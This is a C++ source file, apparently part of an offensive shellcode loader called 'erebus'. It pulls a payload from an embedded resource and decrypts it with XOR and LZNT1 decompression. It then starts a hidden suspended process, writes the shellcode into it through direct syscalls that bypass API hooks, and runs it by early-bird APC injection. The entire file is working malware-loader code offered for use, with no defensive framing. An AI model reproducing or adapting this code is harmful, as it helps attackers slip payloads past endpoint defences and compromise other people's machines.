#include "loader.hpp"

namespace erebus {
	erebus::Config erebus::config{};

	VOID DecompressionLZNT(_Inout_ BYTE* Input, _In_ SIZE_T InputLen)
	{
		SIZE_T OutputLen = InputLen * 2;
		BYTE* Output = new BYTE[OutputLen];
		ULONG FinalOutputSize;

		ImportModule(ntdll);
		ImportFunction(ntdll, typeRtlDecompressBuffer, _RtlDecompressBuffer);

		NTSTATUS status = _RtlDecompressBuffer(COMPRESSION_FORMAT_LZNT1, Output, OutputLen, Input, InputLen, &FinalOutputSize);

		if (!NT_SUCCESS(status))
		{
			LOG_ERROR("RtlDecompressBuffer failed 0x%08X", status);
			delete[] Output;
			return;
		}

		RtlCopyMemory(Input, Output, FinalOutputSize);
		delete[] Output;
		return;
	}

	VOID DecryptionXOR(_Inout_ BYTE* Input, _In_ SIZE_T InputLen, _In_ BYTE* Key, _In_ SIZE_T KeyLen)
	{
		for (SIZE_T i = 0; i < InputLen; i++)
			Input[i] ^= Key[i % KeyLen];
		return;
	}

	PVOID StageResource(IN int resource_id, IN LPCWSTR resource_class, OUT PSIZE_T shellcode_size)
	{
		PVOID shellcode_address;

		HRSRC resource_handle = FindResourceW(nullptr, MAKEINTRESOURCEW(resource_id), resource_class);
		if (!resource_handle)
		{
			LOG_ERROR("Failed to get resource handle. (Code: 0x%08lX)", GetLastError());
			return NULL;
		}

		DWORD resource_size = SizeofResource(nullptr, resource_handle);

		HGLOBAL global_handle = LoadResource(nullptr, resource_handle);
		if (!global_handle)
		{
			LOG_ERROR("Failed to get global handle. (Code: 0x%08lX)", GetLastError());
			return NULL;
		}

		PVOID resource_pointer = LockResource(global_handle);
		if (!resource_pointer)
		{
			LOG_ERROR("Failed to get resource pointer. (Code: 0x%08lX)", GetLastError());
			return NULL;
		}

		shellcode_address = HeapAlloc(GetProcessHeap(), 0, resource_size);
		if (shellcode_address)
		{
			typedef void* (WINAPI* pRtlCopyMemory)(void*, const void*, SIZE_T);
			RtlCopyMemory(shellcode_address, resource_pointer, resource_size);
		}

		*shellcode_size = (SIZE_T)resource_size;
		return shellcode_address;
	}

	PVOID WriteShellcodeInMemory(IN HANDLE handle, IN PVOID shellcode, IN SIZE_T shellcode_size)
	{
		SIZE_T bytes_written = 0;
		PVOID address_ptr = NULL;
		HMODULE ntdll = NULL;
		DWORD old_protection = 0;

		if (!NT_SUCCESS(Sw3NtAllocateVirtualMemory(handle, &address_ptr, 0, &shellcode_size, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE)))
		{
			LOG_ERROR("Failed to allocate memory space.");
			return NULL;
		}
		else LOG_SUCCESS("Address Pointer: 0x%08pX", address_ptr);

		if (!NT_SUCCESS(Sw3NtWriteVirtualMemory(handle, address_ptr, shellcode, shellcode_size, &bytes_written)))
		{
			LOG_ERROR("Error writing shellcode to memory.");
			return NULL;
		}
		else LOG_SUCCESS("Shellcode written to memory.");

		if (!NT_SUCCESS(Sw3NtProtectVirtualMemory(handle, &address_ptr, &shellcode_size, PAGE_EXECUTE_READ, &old_protection)))
		{
			LOG_ERROR("Failed to change protection type.");
			return NULL;
		}
		else LOG_SUCCESS("Protection changed to RX.");

		return address_ptr;
	}
	PVOID WriteShellcodeInMemory(IN HANDLE handle, IN BYTE* shellcode, IN SIZE_T shellcode_size)
	{
		SIZE_T bytes_written = 0;
		PVOID address_ptr = NULL;
		HMODULE ntdll = NULL;
		DWORD old_protection = 0;

		if (!NT_SUCCESS(Sw3NtAllocateVirtualMemory(handle, &address_ptr, 0, &shellcode_size, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE)))
		{
			LOG_ERROR("Failed to allocate memory space.");
			return NULL;
		}
		else LOG_SUCCESS("Address Pointer: 0x%08pX", address_ptr);

		if (!NT_SUCCESS(Sw3NtWriteVirtualMemory(handle, address_ptr, shellcode, shellcode_size, &bytes_written)))
		{
			LOG_ERROR("Error writing shellcode to memory.");
			return NULL;
		}
		else LOG_SUCCESS("Shellcode written to memory.");

		if (!NT_SUCCESS(Sw3NtProtectVirtualMemory(handle, &address_ptr, &shellcode_size, PAGE_EXECUTE_READ, &old_protection)))
		{
			LOG_ERROR("Failed to change protection type.");
			return NULL;
		}
		else LOG_SUCCESS("Protection changed to RX.");

		return address_ptr;
	}

	BOOL CreateProcessSuspended(IN wchar_t cmd[], OUT HANDLE* process_handle, OUT HANDLE* thread_handle)
	{
		SIZE_T lpSize = 0;
		HANDLE parent_handle = INVALID_HANDLE_VALUE;
		const DWORD attribute_count = 1;

		STARTUPINFOW startup_info = {};
		PROCESS_INFORMATION process_info = {};

		BOOL success = CreateProcessW(
			NULL,
			cmd,
			NULL,
			NULL,
			FALSE,
			(CREATE_NO_WINDOW | CREATE_SUSPENDED),
			NULL,
			NULL,
			&startup_info,
			&process_info);

		*process_handle = process_info.hProcess;
		*thread_handle = process_info.hThread;

		Sw3NtClose(parent_handle);

		return success;
	}

	VOID InjectionNtQueueApcThread(IN PVOID shellcode, IN SIZE_T shellcode_size, IN HANDLE hProcess, IN HANDLE hThread)
	{
		LOG_INFO("Injection via. NtQueueApcThread");

		PVOID base_address = NULL;

		base_address = erebus::WriteShellcodeInMemory(hProcess, shellcode, shellcode_size);
		if (base_address == NULL) return;

		Sw3NtQueueApcThread(hThread, (PPS_APC_ROUTINE)base_address, NULL, NULL, NULL);
		Sw3NtResumeThread(hThread, NULL);

		Sw3NtFreeVirtualMemory(hThread, &base_address, 0, MEM_RELEASE);

		Sw3NtClose(hThread);
		Sw3NtClose(hProcess);

		LOG_SUCCESS("Injection Complete!");

		return;
	}
	VOID InjectionNtQueueApcThread(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE hProcess, IN HANDLE hThread)
	{
		LOG_INFO("Injection via. NtQueueApcThread");

		PVOID base_address = NULL;

		base_address = erebus::WriteShellcodeInMemory(hProcess, shellcode, shellcode_size);
		if (base_address == NULL) return;

		Sw3NtQueueApcThread(hThread, (PPS_APC_ROUTINE)base_address, NULL, NULL, NULL);
		Sw3NtResumeThread(hThread, NULL);

		Sw3NtFreeVirtualMemory(hThread, &base_address, 0, MEM_RELEASE);

		Sw3NtClose(hThread);
		Sw3NtClose(hProcess);

		LOG_SUCCESS("Injection Complete!");

		return;
	}
} // End of erebus namespace
